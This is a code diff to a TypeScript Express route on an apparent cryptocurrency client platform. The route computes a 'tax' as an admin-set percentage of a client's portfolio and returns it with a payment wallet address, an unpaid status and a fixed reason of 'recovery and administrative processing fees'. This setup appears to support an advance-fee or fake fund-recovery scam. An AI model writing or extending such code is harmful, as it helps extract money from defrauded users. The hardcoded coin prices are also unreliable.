@@ -1527,13 +1527,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(404).json({ error: 'Client non trouvé' });
       }
 
+      // Calcul du montant de taxe basé sur le pourcentage du portfolio
+      const balances = client.balances || { btc: 0, eth: 0, usdt: 0, ada: 0, dot: 0, sol: 0, link: 0, matic: 0, bnb: 0, xrp: 0 };
+      
+      // Prix exemple pour calcul (en production, utiliser l'API prix réels)
+      const portfolioValue = (
+        balances.btc * 45000 + 
+        balances.eth * 3000 + 
+        balances.usdt * 1 + 
+        balances.ada * 0.5 + 
+        balances.dot * 6 + 
+        balances.sol * 100 + 
+        balances.link * 15 + 
+        balances.matic * 0.8 + 
+        balances.bnb * 300 + 
+        balances.xrp * 0.6
+      );
+      
+      const taxPercentage = parseFloat(client.taxPercentage || '0');
+      const calculatedTaxAmount = (portfolioValue * taxPercentage) / 100;
+
       res.json({
-        taxAmount: client.taxAmount || '0',
+        taxPercentage: client.taxPercentage || '0',
+        taxAmount: calculatedTaxAmount.toFixed(2),
         taxCurrency: client.taxCurrency || 'BTC',
         taxStatus: client.taxStatus || 'unpaid',
         taxWalletAddress: client.taxWalletAddress,
         taxReason: 'Frais de récupération et traitement administratif',
-        transactionHash: client.taxPaymentProof
+        transactionHash: client.taxPaymentProof,
+        portfolioValue: portfolioValue.toFixed(2)
       });
     } catch (error) {
       console.error('Get tax info error:', error);
